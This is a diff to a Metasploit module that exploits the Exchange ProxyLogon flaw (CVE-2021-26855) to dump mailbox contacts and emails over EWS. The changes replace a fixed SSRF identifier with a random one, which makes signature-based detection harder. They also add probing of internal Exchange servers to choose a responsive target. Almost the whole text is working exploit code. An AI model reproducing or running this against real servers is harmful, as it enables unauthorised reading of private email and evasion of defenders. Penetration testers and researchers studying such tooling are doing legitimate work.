@@ -81,11 +81,11 @@ class MetasploitModule < Msf::Auxiliary
   XMLNS = { 't' => 'http://schemas.microsoft.com/exchange/services/2006/types' }.freeze
 
   def dump_contacts(server_name)
-    ssrf = "#{server_name}/EWS/Exchange.asmx?a=~1942062522"
+    ssrf = "#{server_name}/EWS/Exchange.asmx?a=~#{random_ssrf_id}"
 
     response = send_xml('POST', ssrf, soap_countitems(action['id_attribute']))
     if response.body =~ /Success/
-      print_status("Successfuly connected to: #{action['id_attribute']}")
+      print_good("Successfuly connected to: #{action['id_attribute']}")
       xml = Nokogiri::XML.parse(response.body)
 
       folder_id = xml.at_xpath('//t:ContactsFolder/t:FolderId', XMLNS)&.values[0]
@@ -113,11 +113,11 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def dump_emails(server_name)
-    ssrf = "#{server_name}/EWS/Exchange.asmx?a=~1942062522"
+    ssrf = "#{server_name}/EWS/Exchange.asmx?a=~#{random_ssrf_id}"
 
     response = send_xml('POST', ssrf, soap_countitems(datastore['FOLDER']))
     if response.body =~ /Success/
-      print_status("Successfuly connected to: #{datastore['FOLDER']}")
+      print_good("Successfuly connected to: #{datastore['FOLDER']}")
       xml = Nokogiri::XML.parse(response.body)
 
       folder_id = xml.at_xpath('//t:Folder/t:FolderId', XMLNS)&.values[0]
@@ -181,10 +181,16 @@ class MetasploitModule < Msf::Auxiliary
     "#{@proto}://#{datastore['RHOST']}:#{datastore['RPORT']} - #{msg}"
   end
 
+  def random_ssrf_id
+    # https://en.wikipedia.org/wiki/2,147,483,647 (lol)
+    # max. 2147483647
+    rand(1941962752..2147483647)
+  end
+
   def request_autodiscover(server_name)
     xmlns = { 'xmlns' => 'http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a' }
 
-    response = send_xml('POST', "#{server_name}/autodiscover/autodiscover.xml?a=~1942062522", soap_autodiscover)
+    response = send_xml('POST', "#{server_name}/autodiscover/autodiscover.xml?a=~#{random_ssrf_id}", soap_autodiscover)
 
     case response.body
     when %r{<ErrorCode>500</ErrorCode>}
@@ -375,7 +381,7 @@ class MetasploitModule < Msf::Auxiliary
     print_status(message('Attempt to exploit for CVE-2021-26855'))
 
     # request for internal server name.
-    response = send_http(datastore['METHOD'], 'localhost~1942062522')
+    response = send_http(datastore['METHOD'], "localhost~#{random_ssrf_id}")
     if response.code != 500 || response.headers['X-FEServer'].empty?
       print_bad('Could\'t get the \'X-FEServer\' from the headers response.')
 
@@ -390,25 +396,28 @@ class MetasploitModule < Msf::Auxiliary
 
     print_status("Server: #{server_id}")
     print_status("LegacyDN: #{legacy_dn}")
+    print_status("Internal target(s): #{owa_urls.join(', ')}")
 
     # selecting target
-    print_status(message('Selecting the first internal server found'))
+    print_status(message('Selecting the first internal server to respond'))
     if datastore['TARGET'].nil? || datastore['TARGET'].empty?
       target = ''
       owa_urls.each do |url|
         host = url.split('://')[1].split('.')[0].downcase
         next unless host != server_name.downcase
 
+        response = send_http('GET', "#{host}/EWS/Exchange.asmx?a=~#{random_ssrf_id}")
+        next unless response.code == 200
+
         target = host
+        print_good("Targeting internal: #{url}")
 
         break
       end
       fail_with(Failure::NotFound, 'No internal target was found') if target.empty?
-
-      print_status("Targeting internal: #{target}")
     else
       target = datastore['TARGET']
-      print_status("Targeting internal forced to: #{target}")
+      print_good("Targeting internal forced to: #{target}")
     end
 
     # run action
